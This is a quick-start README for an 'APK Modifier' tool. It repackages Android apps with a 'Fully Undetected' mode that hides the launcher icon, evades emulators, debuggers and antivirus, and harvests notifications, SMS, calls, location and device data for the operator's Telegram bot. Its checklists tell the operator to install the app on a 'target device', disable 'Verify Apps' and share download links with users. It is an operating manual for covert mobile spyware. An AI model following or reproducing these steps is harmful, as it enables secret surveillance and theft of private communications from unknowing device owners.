# APK Modifier - Quick Start Guide

## 🚀 5-Minute Setup

### Option 1: Run Web Server Only

```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Configure environment (optional)
cp .env.example .env
# Edit .env with your Telegram bot token and chat ID

# 3. Run server
python app.py

# 4. Open browser
# Visit: http://localhost:5000
```

### Option 2: Build Android APK

```bash
# 1. Install Android Studio
# Download from: https://developer.android.com/studio

# 2. Open project
cd android-app
# Open in Android Studio

# 3. Build APK
./gradlew assembleRelease

# 4. Find APK
# Location: android-app/app/build/outputs/apk/release/app-release.apk
```

### Option 3: Use Packaging Script

```bash
# 1. Make script executable
chmod +x package_into_apk.sh

# 2. Run packaging script
./package_into_apk.sh

# 3. Build from packaged files
# Follow on-screen instructions
```

## 📱 Using the Web Interface

### Step 1: Upload APK
1. Open http://localhost:5000
2. Drag & drop your APK file or click to browse
3. Wait for file info to appear
4. Click "Continue" or scroll down

### Step 2: Configure Options
1. **Select Mode:**
   - ✅ FUD (Fully Undetected) - Recommended for stealth
   - Standard - Faster processing

2. **Library Name:**
   - Enter custom name (e.g., `libxx.so`)
   - Or keep default

3. **Telegram (Optional):**
   - Enter Bot Token
   - Enter Chat ID
   - Get real-time notifications

4. **Server Upload (Optional):**
   - Enter upload server URL
   - APK will be uploaded after processing

### Step 3: Process APK
1. Click "🚀 Process APK"
2. Watch progress bar
3. See elapsed time
4. Wait for completion (40-60 min for FUD mode)

### Step 4: Download
1. Click "⬇️ Download Modified APK"
2. Install on your device
3. Grant all permissions
4. App will start automatically

## 🔑 Getting Telegram Bot Token

1. **Open Telegram** and search for `@BotFather`
2. Send `/newbot` command
3. Follow instructions to create bot
4. Copy the **token** (looks like: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)
5. Send `/start` to your bot
6. Get your **Chat ID**:
   - Search for `@userinfobot`
   - Send `/start`
   - Copy your ID (numeric)

## 📋 System Requirements

### For Web Server:
- Python 3.8 or higher
- 2GB RAM minimum
- 5GB free disk space
- Internet connection

### For Android APK Build:
- Android Studio latest version
- JDK 11 or higher
- 8GB RAM minimum
- 20GB free disk space
- Android SDK Platform 33

### For Running Android App:
- Android 5.0 (API 21) or higher
- 100MB free storage
- Internet connection
- All permissions granted

## 🎯 FUD Mode Features

When you select **FUD (Fully Undetected)**:

✅ **Anti-Detection**
- Emulator detection
- Debugger blocking
- Root detection
- Analysis tool detection

✅ **Obfuscation**
- ProGuard with maximum settings
- String encryption
- Class name randomization
- Resource obfuscation

✅ **Stealth**
- Extended processing (40-60 min)
- Background operation
- System-like appearance
- Hidden launcher icon

✅ **Monitoring**
- All notifications
- SMS & calls
- Location tracking
- Device information
- Telegram alerts

## 🔧 Troubleshooting

### Server won't start
```bash
# Check if port 5000 is available
lsof -i :5000

# Kill process if needed
kill -9 <PID>

# Use different port
PORT=8000 python app.py
```

### APK build fails
```bash
# Update Gradle
./gradlew wrapper --gradle-version 8.1

# Clean build
./gradlew clean
./gradlew assembleRelease
```

### App crashes on Android
1. Check logcat: `adb logcat | grep APKModifier`
2. Grant all permissions in Settings
3. Disable battery optimization
4. Enable "Install from Unknown Sources"

### No Telegram notifications
1. Verify bot token is correct
2. Check chat ID is numeric
3. Send `/start` to bot first
4. Check internet connection

## 📊 Monitoring Dashboard

Access device data monitoring:

```bash
# 1. Open dashboard
http://localhost:5000/dashboard

# 2. View collected data
http://localhost:5000/api/device_data/list

# 3. Filter by type
http://localhost:5000/api/device_data/notification
http://localhost:5000/api/device_data/device_data
```

## 🔐 Security Best Practices

### Before Distribution:
- [ ] Change default app name
- [ ] Use custom signing key
- [ ] Configure real Telegram bot
- [ ] Set up secure upload server
- [ ] Enable HTTPS only

### On Target Device:
- [ ] Grant all permissions
- [ ] Disable battery optimization
- [ ] Enable notification access
- [ ] Allow background activity
- [ ] Disable "Verify Apps"

### For Stealth:
- [ ] Enable FUD mode
- [ ] Use generic icon
- [ ] Hide from launcher after 24h
- [ ] Use system-like name
- [ ] Enable anti-detection

## 📱 APK Installation

### Method 1: ADB
```bash
# Enable USB debugging on device
adb devices
adb install -r app-release.apk
```

### Method 2: Direct Install
1. Copy APK to device
2. Open file manager
3. Tap APK file
4. Enable "Install Unknown Apps"
5. Tap "Install"

### Method 3: Upload to Server
1. Configure upload server in settings
2. APK will be automatically uploaded
3. Share download link with users

## 🎓 Example Usage

### Scenario 1: Personal APK Modification
```bash
# 1. Run server
python app.py

# 2. Upload your APK
# 3. Select Standard mode
# 4. Process (5-10 minutes)
# 5. Download and test
```

### Scenario 2: FUD Distribution
```bash
# 1. Build Android APK
cd android-app && ./gradlew assembleRelease

# 2. Install on target device
adb install app-release.apk

# 3. Configure Telegram bot
# 4. Grant all permissions
# 5. Monitor via Telegram
```

### Scenario 3: Bulk Processing
```bash
# 1. Start server
python app.py &

# 2. Upload multiple APKs via API
curl -X POST -F "apk_file=@app1.apk" \
  -F "mode=fud" \
  http://localhost:5000/upload

# 3. Check status
curl http://localhost:5000/status/<job_id>

# 4. Download when ready
curl -O http://localhost:5000/download/<job_id>
```

## 📞 Getting Help

### Check Logs:
```bash
# Server logs
tail -f logs/app.log

# Android logs
adb logcat | grep -E "APKModifier|Python"

# Check for errors
adb logcat *:E
```

### Common Issues:

**Q: APK processing stuck at 0%**
A: Check server logs, ensure apktool is installed

**Q: Modified APK won't install**
A: Re-sign with apksigner, check signature

**Q: No device data received**
A: Grant all permissions, check Telegram token

**Q: App detected by antivirus**
A: Use FUD mode, apply all obfuscation techniques

## 🎉 Success Checklist

- [ ] Server running on port 5000
- [ ] Web interface accessible
- [ ] APK uploaded successfully
- [ ] FUD mode selected
- [ ] Telegram configured
- [ ] Processing started
- [ ] Progress updates visible
- [ ] APK downloaded
- [ ] APK installed on device
- [ ] Permissions granted
- [ ] Notification access enabled
- [ ] Data appearing in Telegram
- [ ] Dashboard showing data

## 🚀 Next Steps

1. **Test thoroughly** in safe environment
2. **Customize** app name and icon
3. **Configure** secure server upload
4. **Monitor** device data via Telegram
5. **Analyze** collected information
6. **Improve** based on feedback

---

**Need more help?** Check:
- `README.md` - Full documentation
- `BUILD_INSTRUCTIONS.md` - Detailed build guide
- `FEATURES.md` - Complete feature list
- GitHub Issues - Community support

**Version**: 2.0  
**Last Updated**: November 2025
